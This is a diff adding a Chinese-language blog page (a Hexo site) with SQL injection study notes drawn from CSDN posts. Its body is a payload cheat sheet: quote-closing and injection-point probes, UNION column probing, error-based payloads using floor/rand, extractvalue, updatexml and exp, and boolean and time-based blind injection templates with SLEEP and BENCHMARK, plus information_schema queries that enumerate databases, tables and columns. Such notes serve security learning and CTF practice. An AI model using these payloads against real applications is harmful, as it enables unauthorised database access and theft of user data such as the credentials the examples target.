@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="总结来源：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_42181428&#x2F;article&#x2F;details&#x2F;90755280https:&#x2F;&#x2F;blog.csdn.net&#x2F;a15803617402&#x2F;article&#x2F;details&#x2F;82890794">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全学习——SQL注入">
+<meta property="og:url" content="http:&#x2F;&#x2F;no-timing&#x2F;no-timing.github.io&#x2F;2020&#x2F;04&#x2F;03&#x2F;Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5&#x2F;index.html">
+<meta property="og:site_name" content="no-timing">
+<meta property="og:description" content="总结来源：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_42181428&#x2F;article&#x2F;details&#x2F;90755280https:&#x2F;&#x2F;blog.csdn.net&#x2F;a15803617402&#x2F;article&#x2F;details&#x2F;82890794">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-13T07:29:36.916Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://no-timing/no-timing.github.io/2020/04/03/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Web安全学习——SQL注入 | no-timing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">no-timing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/no-timing" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://no-timing/no-timing.github.io/2020/04/03/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ame.jpg">
+      <meta itemprop="name" content="yzz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="no-timing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全学习——SQL注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-03 16:51:33" itemprop="dateCreated datePublished" datetime="2020-04-03T16:51:33+08:00">2020-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-13 15:29:36" itemprop="dateModified" datetime="2020-04-13T15:29:36+08:00">2020-04-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全学习</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>总结来源：</p><p><a href="https://blog.csdn.net/qq_42181428/article/details/90755280" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/90755280</a></p><p><a href="https://blog.csdn.net/a15803617402/article/details/82890794" target="_blank" rel="noopener">https://blog.csdn.net/a15803617402/article/details/82890794</a></p><a id="more"></a>
+
+
+<h4 id="MySQL元数据"><a href="#MySQL元数据" class="headerlink" title="MySQL元数据"></a>MySQL元数据</h4><p><strong>INFORMATION_SCHEMA</strong>是每个MySQL实例中的数据库，该实例存储有关MySQL服务器维护的所有其他数据库的信息。你只能读取该数据库内容，不能修改、增加、删除等操作。</p>
+<p>每个MySQL用户都有权访问这些表，但只能看到表中与用户具有适当访问权限的对象相对应的行。</p>
+<p> <strong>information_schema数据库中常见的表</strong> </p>
+<table>
+<thead>
+<tr>
+<th>表名</th>
+<th>字段名1</th>
+<th>字段名2</th>
+<th>字段名3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>schemata</strong>  存放所有数据库名</td>
+<td>SCHEMA_NAME  数据库名</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>tables</strong>  存放所有表名</td>
+<td>TABLE_SCHEMA  数据库名</td>
+<td>TABLE_NAME  表名</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>columns</strong>  存放所有字段名</td>
+<td>TABLE_SCHEMA  数据库名</td>
+<td>TABLE_NAME  表名</td>
+<td>COLUMN_NAME  字段名</td>
+</tr>
+</tbody></table>
+<h4 id="闭合SQL拼接语句"><a href="#闭合SQL拼接语句" class="headerlink" title="闭合SQL拼接语句"></a>闭合SQL拼接语句</h4><p>要想进行下一步注入，首先需要闭合SQL语句，如何知道闭合符号是什么呢？可通过在参数后面加入单引号或双引号使其整条SQL拼接语句失败，从而可从数据库报错信息得知，若没有数据库报错信息，则只能Fuzz了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,passwd FROM users WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$sql=<span class="string">"SELECT username,passwd FROM users WHERE id='&#123;$id&#125;'"</span>;</span><br><span class="line">$sql=<span class="string">"SELECT username,passwd FROM users WHERE id=(&#123;$id&#125;)"</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h4 id="检测注入点"><a href="#检测注入点" class="headerlink" title="检测注入点"></a>检测注入点</h4><p>可通过逻辑测试、算术运算等方式检测是否存在注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">对于数值型参数来说，可进行算术运算、逻辑运算或函数</span><br><span class="line">id=3-1  //返回id=2的结果，说明进行了算术运算</span><br><span class="line">id=1/1</span><br><span class="line">id=1/0</span><br><span class="line">id=1 and 1=1  //永真</span><br><span class="line">id=1 and 1=0  //永假</span><br><span class="line">id=abs(-2)    //返回id=2的结果</span><br><span class="line"> </span><br><span class="line">对于字符串型参数来说，可进行算术和逻辑运算</span><br><span class="line">id=1&apos; &apos;1&apos;  //不同数据库，字符串连接符不同，MySQL为空格、oracle为||、sqlserver为+</span><br><span class="line">id=3&apos;-&apos;1&apos;    //字符串的相减，显示转换为数字进行运算(MySQL数据库)</span><br><span class="line">id=1&apos; and &apos;1&apos;=&apos;1&apos;</span><br><span class="line">id=1&apos; and &apos;1&apos;=&apos;0&apos;</span><br><span class="line"> </span><br><span class="line">当然，以上是针对布尔型盲注和非盲注，如果网页不返回信息无法进行信息判断，则只能进行时间盲注测试。</span><br><span class="line">id=1&apos; if(2&gt;1,sleep(5),0)</span><br></pre></td></tr></table></figure>
+
+<h4 id="注入常用查询"><a href="#注入常用查询" class="headerlink" title="注入常用查询"></a>注入常用查询</h4><ul>
+<li><strong>获取数据库名</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//通过limit控制符返回指定行记录</span><br><span class="line">SELECT schema_name FROM information_schema.schemata limit 2,1;</span><br><span class="line"> </span><br><span class="line">//通过group_concat()函数一次得到所有记录</span><br><span class="line">SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>获取表名</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables WHERE  table_schema=&apos;DB_name&apos; limit 1,1;</span><br><span class="line"> </span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE  table_schema=&apos;DB_name&apos;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>获取字段名</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE  table_schema=&apos;DB_name&apos; AND table_name=&apos;table_name&apos; limit 2,1;</span><br><span class="line"> </span><br><span class="line">SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE  table_schema=&apos;DB_name&apos; AND table_name=&apos;table_name&apos;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>查询数据</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM db_name.table_name;</span><br></pre></td></tr></table></figure>
+
+<h4 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h4><p><strong>判断列数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; order by 1 %23</span><br><span class="line">id=1&apos; order by 2 %23</span><br><span class="line">id=1&apos; order by 3 %23</span><br><span class="line">·····</span><br><span class="line">id=1&apos; order by n %23</span><br><span class="line">直到报错为止，最后一个页面正确回显的数，即为列数</span><br></pre></td></tr></table></figure>
+
+<p><strong>判断回显位置</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; UNION SELECT 1,2 %23</span><br></pre></td></tr></table></figure>
+
+<p>然后在可回显的位置处构造SQL语句进行注入</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul>
+<li><strong>floor</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>ExtractValue(有长度限制,最长32位)</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>UpdateXml(有长度限制,最长32位)</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Error based Double Query Injection</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>exp(5.5.5以上)</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>polygon</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username=&quot;&quot;and polygon (password);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`password`&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>常常需要写脚本来进行注入</p>
+<p><strong>基于布尔的盲注</strong></p>
+<p>对于<strong>基于布尔的盲注</strong>，可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</span><br><span class="line">// k ，结合limit，选择偏移为k的行</span><br><span class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</span><br><span class="line">// SUBSTR() 也可以换成 SUBSTRING()</span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </span><br><span class="line"></span><br><span class="line">&apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</span><br></pre></td></tr></table></figure>
+
+<p><strong>基于时间的盲注</strong> </p>
+<p>对于<strong>基于时间的盲注</strong>，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#检测方法</span><br><span class="line">1 OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1&apos; OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">&apos;) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">SELECT SLEEP(25) #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line"></span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure>
+
+<p><strong>基于报错的盲注</strong></p>
+<p>对于<strong>基于报错的盲注</strong>，基本是在rand()函数作为group by的字段进行联用的时候会违反Mysql的约定而报错。rand()随机不确定性，使得group by会使用多次而报错。</p>
+<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p><strong>查看当前数据库版本</strong></p>
+<ul>
+<li>version()</li>
+<li>@@version</li>
+<li>@@global.version</li>
+</ul>
+<p><strong>查看当前登陆用户</strong></p>
+<ul>
+<li>user()</li>
+<li>current_user()</li>
+<li>system_user()</li>
+<li>session_user()</li>
+</ul>
+<p><strong>当前使用的数据库</strong></p>
+<ul>
+<li>database()</li>
+<li>schema()</li>
+</ul>
+<p><strong>路径查询</strong></p>
+<ul>
+<li>@@basedir ——mysql安装路径</li>
+<li>@@slave_load_tampdir ——临时文件夹路径</li>
+<li>@@datadir ——数据存储路径</li>
+<li>@@character_sets_dir ——字符集设置文件路径</li>
+<li>@@log_error ——错误日志文件路径</li>
+<li>@@pid_file ——pid-file文件路径</li>
+</ul>
+<p><strong>字符串连接函数</strong></p>
+<ul>
+<li>group_concat() ——返回一个字符串结果，该结果由分组中的值连接组合而成。</li>
+<li>group_concat([DISTINCT] 要连接的字段[Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</li>
+<li>concat() ——将多个字符串连接成一个字符串，CONCAT(str1,str2,…)</li>
+<li>concat_ws() ——有分隔符的字符串连接,CONCAT_WS(separator,str1,str2,…)</li>
+</ul>
+<p><strong>盲注常用函数</strong></p>
+<ul>
+<li>length(str) ——返回字符串str的长度</li>
+<li>mid(str, start [,length]) ——从字符串str的start(从1开始)位置开始返回长的为length的部分</li>
+<li>substr(str, start [,length]) ——从字符串str的start(从1开始)位置开始返回长的为length的部分</li>
+<li>left(str, length) ——返回具有指定长度的字符串的左边部分</li>
+<li>ord() ——返回字符串第一个字符的 ASCII 值</li>
+<li>ascii() ——返回字符串第一个字符的 ASCII 值</li>
+</ul>
+<p><strong>Time-Based常用函数</strong></p>
+<ul>
+<li>BENCHMARK(count,expr)   ——重复count次执行表达式expr</li>
+<li>sleep(n) ——暂停数据库n秒</li>
+<li>if(expr1,expr2,expr3) ——如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值</li>
+</ul>
+<p><strong>Wrong-Based常用函数</strong></p>
+<ul>
+<li>rand(int) ——以int为种子生成伪随机数</li>
+<li>floor() ——返回小于等于该值的最大整数</li>
+<li>count() ——统计个数</li>
+<li>updatexml()</li>
+</ul>
+<blockquote>
+<p>updatexml()函数</p>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>作用： 改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
+</blockquote>
+<p>例如，<code>updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);</code><br>由于updatexml()的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
+<p><strong>其他函数</strong></p>
+<ul>
+<li>bin() ——返回值的二进制表示</li>
+<li>conv(str,m,n) ——进制转换，将str从m进制转换为n进制</li>
+<li>lower() ——转成小写字母</li>
+<li>upper() ——转成大写字母</li>
+<li>hex() ——十六进制编码</li>
+<li>unhex() ——十六进制解码</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/04/02/CTF-WEB%E7%AC%94%E8%AE%B0/" rel="next" title="CTF-WEB笔记">
+                  <i class="fa fa-chevron-left"></i> CTF-WEB笔记
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E5%88%B0%E7%86%9F%E7%BB%83%E7%BC%96%E5%86%99Poc/" rel="prev" title="Web安全学习——从代码审计学习到熟练编写Poc">
+                  Web安全学习——从代码审计学习到熟练编写Poc <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL元数据"><span class="nav-text">MySQL元数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#闭合SQL拼接语句"><span class="nav-text">闭合SQL拼接语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#检测注入点"><span class="nav-text">检测注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入常用查询"><span class="nav-text">注入常用查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION注入"><span class="nav-text">UNION注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注"><span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用函数"><span class="nav-text">常用函数</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yzz"
+      src="/images/ame.jpg">
+  <p class="site-author-name" itemprop="name">yzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
